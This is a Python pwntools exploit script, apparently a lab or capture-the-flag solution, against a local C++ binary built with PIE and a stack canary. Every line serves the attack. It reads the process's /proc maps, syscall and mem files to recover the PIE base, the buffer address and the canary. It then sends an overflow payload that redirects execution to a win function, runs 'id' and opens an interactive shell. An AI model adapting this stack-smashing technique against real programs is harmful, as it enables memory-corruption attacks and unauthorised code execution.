import pwn
import time

pwn.context.arch = 'amd64'
pwn.context.log_level = 'info'

# a.out is g++ -g build: PIE + canary + C++ mangled win (_Z3winv @ 0x11e9)
# buf @ rbp-0x30, canary @ rbp-0x8, saved rip @ rbp+8
#   buf -> canary: 40, buf -> rip: 56
WIN_OFF = 0x11e9

io = pwn.process('./a.out')
io.recvuntil(b'value: ')
pid = io.pid

# 1) PIE base from maps
base = None
for line in open(f'/proc/{pid}/maps'):
    if 'a.out' in line:
        base = int(line.split('-')[0], 16)
        break
assert base, 'failed to get PIE base'
win = base + WIN_OFF
pwn.log.info(f'base={hex(base)} win={hex(win)}')

# 2) buf addr from /proc/pid/syscall (blocked in read: rsi = buf)
# format: nr a0 a1 a2 a3 a4 a5 sp pc
fields = open(f'/proc/{pid}/syscall').read().split()
buf_addr = int(fields[2], 16)
canary_addr = buf_addr + 0x30 - 8

# 3) canary from /proc/pid/mem
with open(f'/proc/{pid}/mem', 'rb') as mem:
    mem.seek(canary_addr)
    canary = pwn.u64(mem.read(8))
pwn.log.info(f'canary={hex(canary)}')

# 4) overflow: pad + canary + fake rbp + win
payload  = b'A' * 40
payload += pwn.p64(canary)
payload += b'B' * 8
payload += pwn.p64(win)

io.send(payload)
time.sleep(0.2)
io.sendline(b'echo PWNED_AOUT; id')
print(io.recvrepeat(timeout=2))
io.interactive()
